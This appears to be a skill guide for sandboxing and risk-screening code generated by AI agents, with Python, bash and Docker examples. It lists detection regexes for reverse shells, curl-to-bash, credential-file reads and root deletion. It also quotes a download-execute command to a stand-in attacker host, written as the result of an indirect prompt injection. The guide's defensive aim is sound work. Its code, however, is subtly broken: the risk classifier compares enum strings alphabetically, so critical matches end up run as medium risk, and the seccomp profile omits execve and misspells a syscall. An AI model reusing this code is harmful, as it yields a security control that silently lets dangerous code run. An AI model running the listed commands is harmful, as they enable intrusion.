---
name: agent-code-execution-sandboxing
description: >-
  Sandboxes and validates agent-generated or agent-triggered code before execution to prevent
  vibe-coding runaway, remote code execution, and attacker-controlled code injection in
  autonomous AI agent pipelines. Covers container-based isolation, static analysis of
  generated commands, allowlisted interpreter policies, seccomp/AppArmor restrictions,
  and mandatory review workflows for generated code above a risk threshold. Based on
  OWASP Top 10 for Agentic Applications (ASI05:2026 Unexpected Code Execution). Activates
  when building code-execution capabilities for AI agents, auditing agent sandboxes for
  escape vectors, or investigating RCE incidents in autonomous coding or DevOps agent systems.
domain: cybersecurity
subdomain: ai-security
tags:
- agentic-security
- code-execution
- sandboxing
- OWASP-Agentic-Top10
- ASI05
- RCE
version: '1.0'
author: mukul975
license: Apache-2.0
atlas_techniques:
- AML.T0051
nist_ai_rmf:
- GOVERN-1.1
- MANAGE-2.2
- MEASURE-2.8
d3fend_techniques:
- Executable Denylisting
- Application Hardening
nist_csf:
- PR.PS-01
- PR.PS-04
- DE.CM-01
---
# Agent Code Execution Sandboxing

## When to Use

- Implementing a safe code execution environment for AI coding agents, DevOps automation agents, or data analysis agents that generate and run code
- Auditing an existing agent code-execution sandbox for container escape vulnerabilities, missing resource limits, or overly permissive syscall policies
- Static-analyzing agent-generated shell scripts or Python code for injection patterns before execution
- Defining a risk-tiered execution policy that auto-approves low-risk code and routes high-risk code for human review
- Investigating incidents where an AI agent generated and executed code that caused unintended system changes (vibe-coding runaway)

**Do not use** this skill for arbitrary user-submitted code execution — agent-generated code still requires a production-hardened sandbox with resource limits and network isolation.

## Prerequisites

- Docker 24+ or Podman for container-based isolation
- `bandit` for Python static analysis: `pip install bandit`
- `semgrep` for multi-language static analysis: `brew install semgrep`
- `seccomp` profiles (Linux) or Docker security options
- Python 3.10+ with `subprocess`, `resource` for resource-limited execution
- Optional: `gVisor` (runsc) for kernel-level sandbox isolation

## Workflow

### Step 1: Classify Generated Code by Risk Level

```python
import re
from enum import Enum

class CodeRisk(Enum):
    LOW = "low"         # auto-execute in sandbox
    MEDIUM = "medium"   # execute with extra restrictions
    HIGH = "high"       # require human review
    CRITICAL = "critical"  # block automatically

HIGH_RISK_PATTERNS = {
    CodeRisk.CRITICAL: [
        r"(rm|del|shred)\s+(-[rf]+\s+)?/",      # delete from root
        r"(mkfs|format|dd)\s+",                  # disk formatting
        r"curl\s+.*\|\s*(bash|sh|python)",        # download-execute
        r"eval\s*\(",                             # dynamic eval
        r"subprocess\.call.*shell\s*=\s*True",   # shell=True
        r"(nc|netcat)\s+.*-e\s+",               # reverse shell
        r"/etc/(passwd|shadow|sudoers)",         # sensitive files
        r"chmod\s+[67][67][67]",                 # world-writable
        r"iptables.*-F",                         # flush firewall
    ],
    CodeRisk.HIGH: [
        r"(os\.system|subprocess\.Popen).*shell",
        r"import\s+(os|subprocess|socket|shlex)",
        r"open\s*\(.+,\s*['\"]w['\"]",          # file write
        r"requests\.(get|post)\s*\(",            # network calls
        r"(DROP|DELETE|TRUNCATE)\s+TABLE",       # destructive SQL
    ],
    CodeRisk.MEDIUM: [
        r"import\s+(json|csv|pandas|numpy)",
        r"open\s*\(.+,\s*['\"]r['\"]",           # file read
        r"print\s*\(",
    ],
}

def classify_code_risk(code: str) -> tuple[CodeRisk, list[str]]:
    matched_patterns = []
    highest_risk = CodeRisk.LOW

    for risk_level in [CodeRisk.CRITICAL, CodeRisk.HIGH, CodeRisk.MEDIUM]:
        for pattern in HIGH_RISK_PATTERNS.get(risk_level, []):
            if re.search(pattern, code, re.IGNORECASE | re.MULTILINE):
                matched_patterns.append(pattern)
                if risk_level.value > highest_risk.value:
                    highest_risk = risk_level

    return highest_risk, matched_patterns
```

### Step 2: Static Analysis Before Execution

```bash
# Run bandit on agent-generated Python code
echo "$GENERATED_CODE" > /tmp/agent_code_$$.py
bandit /tmp/agent_code_$$.py -f json -o /tmp/bandit_$$.json
BANDIT_SCORE=$(jq '.metrics._totals."SEVERITY.HIGH"' /tmp/bandit_$$.json)
if [ "$BANDIT_SCORE" -gt "0" ]; then
  echo "BLOCK: bandit found $BANDIT_SCORE HIGH severity issues"
  cat /tmp/bandit_$$.json
  exit 1
fi

# Run semgrep for broader injection patterns
semgrep --config "p/command-injection" \
        --config "p/dangerous-os-exec" \
        /tmp/agent_code_$$.py --json --quiet > /tmp/semgrep_$$.json
SEMGREP_FINDINGS=$(jq '.results | length' /tmp/semgrep_$$.json)
if [ "$SEMGREP_FINDINGS" -gt "0" ]; then
  echo "BLOCK: semgrep found $SEMGREP_FINDINGS issues"
fi
```

### Step 3: Execute in Docker Sandbox with Strict Limits

```bash
# Run agent-generated Python in a hardened Docker sandbox
docker run --rm \
  --network none \
  --read-only \
  --tmpfs /tmp:exec,size=64m \
  --tmpfs /home/sandbox:exec,size=32m \
  --memory="256m" \
  --cpus="0.5" \
  --pids-limit 64 \
  --security-opt no-new-privileges:true \
  --security-opt seccomp=/etc/docker/agent-seccomp.json \
  --cap-drop ALL \
  --user 65534:65534 \
  -v /tmp/agent_code.py:/sandbox/code.py:ro \
  python:3.12-slim \
  timeout 30 python /sandbox/code.py
```

Create a restrictive seccomp profile:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": ["read", "write", "open", "close", "stat", "fstat",
                "lstat", "mmap", "mprotect", "munmap", "brk", "rt_sigaction",
                "rt_sigprocmask", "ioctl", "access", "pipe", "select", "dup",
                "getdents", "getcwd", "exit", "exit_group", "futex",
                "set_robust_list", "arch_prctrl", "openat"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### Step 4: Resource-Limited Execution in Python

```python
import resource, subprocess, os, signal

def execute_sandboxed_python(code: str, timeout_seconds: int = 30) -> dict:
    risk, patterns = classify_code_risk(code)

    if risk == CodeRisk.CRITICAL:
        return {"blocked": True, "reason": "CRITICAL patterns found",
                "patterns": patterns}

    if risk == CodeRisk.HIGH:
        return {"blocked": True, "reason": "HIGH risk patterns require human review",
                "patterns": patterns}

    def set_limits():
        resource.setrlimit(resource.RLIMIT_CPU, (10, 10))         # 10 CPU seconds
        resource.setrlimit(resource.RLIMIT_AS, (256*1024*1024,    # 256MB memory
                                                 256*1024*1024))
        resource.setrlimit(resource.RLIMIT_NOFILE, (32, 32))       # 32 open files
        resource.setrlimit(resource.RLIMIT_NPROC, (4, 4))          # 4 processes
        os.setsid()  # new process group for clean kill

    try:
        proc = subprocess.Popen(
            ["python3", "-c", code],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            preexec_fn=set_limits,
        )
        stdout, stderr = proc.communicate(timeout=timeout_seconds)
        return {
            "blocked": False,
            "returncode": proc.returncode,
            "stdout": stdout.decode()[:4096],
            "stderr": stderr.decode()[:1024],
        }
    except subprocess.TimeoutExpired:
        os.killpg(proc.pid, signal.SIGKILL)
        return {"blocked": True, "reason": "execution timeout"}
```

### Step 5: Human Review Workflow for High-Risk Code

```python
def route_code_for_review(code: str, risk: CodeRisk,
                           ask_human) -> dict:
    if risk in (CodeRisk.LOW, CodeRisk.MEDIUM):
        return execute_sandboxed_python(code)

    review_prompt = (
        f"[CODE REVIEW REQUIRED — {risk.value.upper()} RISK]\n\n"
        f"The agent wants to execute the following code:\n"
        f"```python\n{code}\n```\n\n"
        f"Approve execution? (yes/no): "
    )
    decision = ask_human(review_prompt).strip().lower()

    if decision == "yes":
        return execute_sandboxed_python(code, timeout_seconds=60)
    return {"blocked": True, "reason": "rejected by human reviewer"}
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Vibe-Coding Runaway** | When an autonomous coding agent generates and self-executes unreviewed commands, accidentally causing destructive effects like deleting production data |
| **Sandbox Escape** | An attack where code executing inside a container or sandbox exploits a vulnerability to gain access to the host system |
| **Seccomp Profile** | A Linux kernel security feature that restricts which system calls a containerized process may make |
| **Resource Limit (rlimit)** | OS-enforced cap on a process's CPU time, memory, open files, and child processes |
| **Static Analysis** | Analyzing code before execution (bandit, semgrep) to detect dangerous patterns without running the code |
| **Risk Tiering** | Classifying generated code by danger level to apply appropriate controls — auto-approve, sandbox, or human-review |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **bandit** | Python SAST tool that detects dangerous patterns (shell injection, hardcoded passwords, unsafe deserialization) in generated code |
| **semgrep** | Multi-language static analyzer with rules for dangerous OS exec patterns, injection vectors, and unsafe operations |
| **Docker seccomp** | Container security option that restricts the host syscalls available to the sandboxed agent code |
| **gVisor (runsc)** | Google's user-space kernel that intercepts all syscalls from containerized workloads, providing strong sandbox isolation |
| **firejail** | Lightweight Linux sandbox using namespaces, seccomp, and AppArmor for restricting agent process capabilities |

## Common Scenarios

- **Vibe-coding runaway**: An agent in a self-repair loop generates `rm -rf /data/` as part of a "cleanup" step. The CRITICAL pattern `rm.*-rf.*/ ` is detected statically; the code is blocked before execution.
- **Download-execute injection**: An indirect injection causes the agent to generate `import subprocess; subprocess.run("curl evil.com/payload | bash", shell=True)`. Both `curl.*|.*bash` (CRITICAL) and `shell=True` (HIGH) patterns are flagged; the code is blocked.
- **Memory exhaustion via agent**: An agent generates code allocating a 100GB array. The Docker `--memory=256m` limit causes the container to be OOM-killed after 256MB, preventing host memory exhaustion.

## Output Format

```json
{
  "execution_timestamp": "2026-04-26T20:00:00Z",
  "code_hash": "sha256:3f2a...",
  "risk_classification": "CRITICAL",
  "patterns_found": [
    "curl.*|.*bash — download-execute pattern",
    "eval\\s*\\( — dynamic evaluation"
  ],
  "static_analysis": {
    "bandit_high_severity": 2,
    "semgrep_findings": 1
  },
  "execution_decision": "BLOCKED",
  "reason": "CRITICAL patterns found — code execution prevented",
  "human_review_required": false
}
```
